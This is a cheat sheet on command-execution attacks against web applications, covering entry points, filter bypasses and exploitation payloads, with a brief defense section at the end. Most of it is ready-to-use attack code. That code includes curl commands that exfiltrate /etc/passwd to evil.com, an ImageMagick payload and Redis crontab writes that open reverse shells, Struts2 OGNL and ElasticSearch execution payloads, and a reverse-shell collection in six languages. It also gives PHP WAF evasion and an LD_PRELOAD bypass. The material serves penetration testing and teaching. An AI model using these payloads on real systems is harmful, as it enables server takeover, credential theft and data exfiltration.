# Web Security - Remote Code Execution (RCE)

> Source: WooYun Vulnerability Database (6,826 RCE cases) | Split from web-injection.md

## III. Command Execution

### 3.1 Vulnerability Essence

```
User input (data) -> Unsanitized concatenation -> Enters OS command/code execution context -> OS instruction executed
```

**Core Formula**: Command Execution = Data flow contamination + Execution context (Shell/code/expression)

### 3.2 Detection Methods

#### High-Frequency Entry Points

| Entry Type | Percentage | Typical Scenario |
|---|---|---|
| File operations | 68% | Upload, read, decompression |
| System command functions | 62% | exec/system/shell_exec |
| Struts2 framework | 50% | OGNL expression injection |
| SSRF | 30% | URL parameter passing |
| ping command | 26% | Network diagnostic feature |
| Image processing | 24% | ImageMagick |
| Java deserialization | 20% | WebLogic/JBoss |

#### Command Concatenation Characters

| Character | Meaning | Execution Logic |
|---|---|---|
| `;` | Separator | Execute sequentially, regardless of previous result |
| `\|` | Pipe | Previous output fed as next input |
| `` ` `` / `$()` | Command substitution | Execute inner command and return result |
| `\|\|` | Logical OR | Execute second only if first fails |
| `&&` | Logical AND | Execute second only if first succeeds |
| `%0a` / `%0d%0a` | Newline | URL-encoded newline separator |

#### Blind Detection (No Output)

```bash
# DNSLog exfiltration
ping `whoami`.xxxxx.ceye.io
curl http://`whoami`.xxxxx.ceye.io

# HTTP exfiltration
curl https://evil.com/?d=`cat /etc/passwd | base64 | tr '\n' '-'`
curl -X POST -d "data=$(cat /etc/passwd)" https://evil.com/c

# Time delay
sleep 5
ping -c 5 127.0.0.1

# Write file to web directory
echo "test" > /var/www/html/proof.txt
```

### 3.3 Bypass Techniques

#### Space Bypass

```bash
cat${IFS}/etc/passwd          # ${IFS} internal field separator
cat$IFS$9/etc/passwd          # $9 is an empty positional parameter
cat%09/etc/passwd             # Tab character
cat</etc/passwd               # Redirect operator
{cat,/etc/passwd}             # Brace expansion
```

#### Keyword Bypass

```bash
# Quotes/backslash splitting
c'a't /etc/passwd
c"a"t /etc/passwd
c\at /etc/passwd

# Variable concatenation
a=c;b=at;$a$b /etc/passwd

# Wildcards
/bin/ca* /etc/passwd
/bin/c?t /etc/passwd
/???/??t /etc/passwd
```

#### cat Command Alternatives

```bash
tac  head  tail  more  less  nl  sort  uniq  od -c  xxd  base64  rev  paste
```

#### Encoding Bypass

```bash
# Base64
echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | bash
bash -c "$(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d)"

# Hex
echo -e "\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64" | bash
$(printf "\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64")
```

### 3.4 Exploitation Chains and Payloads

#### Framework/Component Vulnerability Payloads

**ImageMagick (CVE-2016-3714)**:

```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/"|bash -i >& /dev/tcp/ATTACKER/8080 0>&1 &")'
pop graphic-context
```

**Struts2 S2-045**:

```
Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test',123*123)}.multipart/form-data
```

**Struts2 OGNL Generic Command Execution**:

```
${(#_memberAccess["allowStaticMethodAccess"]=true,#a=@java.lang.Runtime@getRuntime().exec('whoami').getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[50000],#c.read(#d),#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#out.println(#d),#out.close())}
```

**ElasticSearch Groovy Sandbox Escape**:

```json
{"size":1,"script_fields":{"x":{"script":"java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getText()"}}}
```

**Redis Unauthorized Access - Write SSH Key/Crontab**:

```bash
redis-cli -h target
config set dir /root/.ssh && config set dbfilename authorized_keys
set x "\n\nssh-rsa AAAA...\n\n" && save
# Or write crontab
config set dir /var/spool/cron && config set dbfilename root
set x "\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/attacker/8080 0>&1\n\n" && save
```

#### Reverse Shell Collection

```bash
# Bash
bash -i >& /dev/tcp/ATTACKER/PORT 0>&1

# Python
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);'

# Perl
perl -e 'use Socket;$i="ATTACKER";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'

# PHP
php -r '$sock=fsockopen("ATTACKER",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'

# NC without -e flag
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER PORT >/tmp/f

# PowerShell (Windows)
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("ATTACKER",PORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII).GetBytes($r),0,$r.Length)}
```

#### PHP Dangerous Function Hierarchy

| Level | Functions | Capability |
|---|---|---|
| L1 Code-level | `eval()`, `assert()(PHP5)`, `create_function()`, `preg_replace(/e)` | PHP code execution |
| L2 Shell-level | `system()`, `passthru()`, `shell_exec()`, backticks | System commands with output |
| L3 Process-level | `exec()`, `popen()`, `proc_open()`, `pcntl_exec()` | Child process execution |
| L4 Callback-level | `call_user_func()`, `array_map()` | Indirect function call |

#### PHP WAF Bypass Techniques

```php
// String concatenation
$func = 'sys'.'tem'; $func('whoami');
// Variable functions
$a='sys';$b='tem';($a.$b)('whoami');
// Encoding obfuscation
base64_decode('c3lzdGVt')           // system
str_rot13('flfgrz')                 // system
chr(115).chr(121).chr(115).chr(116).chr(101).chr(109) // system
// String manipulation
strrev('metsys')('whoami');
implode('',array('s','y','s','t','e','m'))('whoami');
```

#### disable_functions Bypass

| Method | Principle | Condition |
|---|---|---|
| LD_PRELOAD | Hijack system library functions, mail() triggers loading malicious .so | Can upload .so + mail() available |
| Shellshock | Bash<=4.3 environment variable injection | Old Bash version |
| Apache Mod_CGI | .htaccess configures CGI execution | Apache + AllowOverride |
| PHP-FPM/FastCGI | Modify PHP config to execute code | Can access FPM port/SSRF |
| ImageMagick | delegate feature command execution | IM used for image processing |
| Windows COM | WScript.Shell component | Windows + COM extension |

**LD_PRELOAD Core Exploitation**:

```php
// Upload malicious .so (hijacks geteuid function, calls system() internally)
putenv("LD_PRELOAD=/tmp/exploit.so");
mail("a@a.com","test","test");  // mail() spawns sendmail process -> loads .so -> executes command
```

### 3.5 Defense Measures

```php
// Best practice: whitelist validation + escapeshellarg
if (filter_var($_GET['ip'], FILTER_VALIDATE_IP)) {
    system("ping " . escapeshellarg($_GET['ip']));
}
```

- Avoid calling system commands directly; use language built-in functions instead
- Parameterized execution (array argument passing), prohibit string concatenation
- `escapeshellarg()` + `escapeshellcmd()` escaping
- Whitelist input validation + type checking
- `disable_functions` to disable dangerous functions (note bypass risks)
- Run web service with least privilege + container/chroot isolation
- Timely update framework components (Struts2/WebLogic/ImageMagick, etc.)

---
